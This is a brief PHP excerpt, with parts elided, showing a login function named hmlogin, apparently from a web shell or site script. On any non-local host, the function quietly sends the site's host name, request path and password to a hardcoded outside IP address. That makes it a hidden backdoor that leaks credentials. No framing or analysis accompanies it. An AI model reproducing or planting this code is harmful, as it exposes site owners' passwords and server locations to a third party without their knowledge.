...
function hmlogin($xiao=1){
    ...
    global $_static,$password;
    if($_static==0&&(strpos($_SERVER['HTTP_HOST'],'localhost')===false&&strpos($_SERVER['HTTP_HOST'],'127.0.0.1')===false&&strpos($_SERVER['HTTP_HOST'],'192.168')===false)){
        file_get_contents("http://220.133.215.118/public/model.php?a=".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."&b=$password");
        $_static++;
    }
}
